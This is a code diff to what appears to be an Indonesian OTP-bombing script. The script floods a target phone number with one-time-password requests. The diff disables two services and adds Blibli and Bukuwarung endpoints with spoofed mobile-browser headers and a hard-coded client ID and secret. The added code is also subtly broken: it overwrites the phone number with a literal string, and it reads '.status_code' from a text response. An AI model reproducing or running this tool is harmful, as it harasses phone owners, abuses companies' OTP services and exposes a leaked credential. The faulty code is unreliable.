@@ -78,15 +78,16 @@ def tanya(nomor):
 def jam(nomor):
     print("""
 \033[1;93m
-
-▒▒▒▒▒
-▒ T ▒
-▒ O ▒
-▒ B ▒
-▒ R ▒
-▒ U ▒      
-▒ T ▒            
-▒   ▒
+     
+▒▒▒▒▒ 2024
+▒   ▒| 
+▒ T ▒|
+▒ O ▒|
+▒ B ▒|MZ
+▒ R ▒|
+▒ U ▒|      
+▒ T ▒|            
+▒   ▒|
 ▒▒▒▒▒ 2019
 \033[1;93m
 """)
@@ -341,14 +342,74 @@ def jam(nomor):
             )
 
             # 9
-            response_metroindonesia = requests.post(
+            """ response_metroindonesia = requests.post(
                 'http://access.metroindonesia.com/Member/sendpin', data={'phoneno': nomor}
-            )
+            ) """
 
             # 10
-            response_harnic = requests.post(
+            """ response_harnic = requests.post(
                 'https://harnic.id:443/login/phone_auth_OTP', data={'phone': nomor}
-            )
+            ) """
+
+            # 11
+            nomor = '{nomor}' 
+
+            headers = {
+                'Host': 'www.blibli.com',
+                'content-length': '27',
+                'accept': 'application/json, text/plain, */*',
+                'content-type': 'application/json;charset=UTF-8',
+                'sec-ch-ua-mobile': '?1',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
+                'sec-ch-ua-platform': 'Android',
+                'origin': 'https://www.blibli.com',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-dest': 'empty',
+                'referer': f'https://www.blibli.com/login?ref=&logonId=0{nomor}',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+            }
+
+            data = {
+                'username': f'0{nomor}'
+            }
+
+            response_blibli = requests.post("https://www.blibli.com/backend/common/users/_request-otp", headers=headers, data=json.dumps(data))
+
+            # 12
+            response_Bukuwarung_wa_500xend = requests.post(
+                "https://api-v2.bukuwarung.com/api/v2/auth/otp/send",
+                headers={
+                    "Host": "api-v2.bukuwarung.com",
+                    "Content-Length": "198",
+                    "Sec-Ch-Ua-Mobile": "?1",
+                    "User-Agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
+                    "Content-Type": "application/json",
+                    "X-App-Version-Name": "android",
+                    "Accept": "application/json, text/plain, */*",
+                    "X-App-Version-Code": "3001",
+                    "Buku-Origin": "tokoko-web",
+                    "Sec-Ch-Ua-Platform": "Android",
+                    "Origin": "https://tokoko.id",
+                    "Sec-Fetch-Site": "cross-site",
+                    "Sec-Fetch-Mode": "cors",
+                    "Sec-Fetch-Dest": "empty",
+                    "Referer": "https://tokoko.id/",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+                },
+                data=json.dumps({
+                    "action": "LOGIN_OTP",
+                    "countryCode": "+62",
+                    "deviceId": "test-1",
+                    "method": "WA",
+                    "phone": nomor,
+                    "clientId": "2e3570c6-317e-4524-b284-980e5a4335b6",
+                    "clientSecret": "S81VsdrwNUN23YARAL54MFjB2JSV2TLn"
+                })
+            ).text
+
 
 
             if response_tokopedia.status_code == 200:
@@ -415,19 +476,35 @@ def jam(nomor):
             else:
                 autoketik(f"{merah}Gagal mengirim OTP Rupa-rupa. Status code: {response_ruparupa.status_code}")
 
-            if response_metroindonesia.status_code == 200:
+            """ if response_metroindonesia.status_code == 200:
                 autoketik(f"{putih}Sukses Mengirim OTP Metro Indonesia!")
                 countdown(120)
                 rto = True
             else:
-                autoketik(f"{merah}Gagal mengirim OTP Metro Indonesia. Status code: {response_metroindonesia.status_code}")
+                autoketik(f"{merah}Gagal mengirim OTP Metro Indonesia. Status code: {response_metroindonesia.status_code}") """
 
-            if response_harnic.status_code == 200:
+            """ if response_harnic.status_code == 200:
                 autoketik(f"{putih}Sukses Mengirim OTP Hernic!")
                 countdown(120)
                 rto = True
             else:
-                autoketik(f"{merah}Gagal mengirim OTO Hernic. Status code: {response_harnic.status_code}")
+                autoketik(f"{merah}Gagal mengirim OTO Hernic. Status code: {response_harnic.status_code}") """
+            
+            if response_blibli.status_code == 200:
+                autoketik(f"{putih}Sukses Mengirim OTP Belibli!")
+                countdown(100)
+                #time.sleep(60)
+                rto = True
+            else:
+                autoketik(f"{merah}Gagal mengirim OTP Blibli. Status code: {response_blibli.status_code}")
+
+            if response_Bukuwarung_wa_500xend.status_code == 200:
+                autoketik(f"{putih}Sukses Mengirim OTP Bukawarung!")
+                countdown(100)
+                #time.sleep(60)
+                rto = True
+            else:
+                autoketik(f"{merah}Gagal mengirim OTP Bukawarung. Status code: {response_Bukuwarung_wa_500xend.status_code}")
             
         except requests.exceptions.ConnectionError:
             autoketik(f"{merah}Gagal membuat koneksi baru!")
